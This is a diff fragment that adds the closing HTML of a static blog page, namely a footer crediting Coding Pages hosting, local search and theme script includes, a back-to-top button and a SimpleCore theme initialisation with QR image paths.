+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
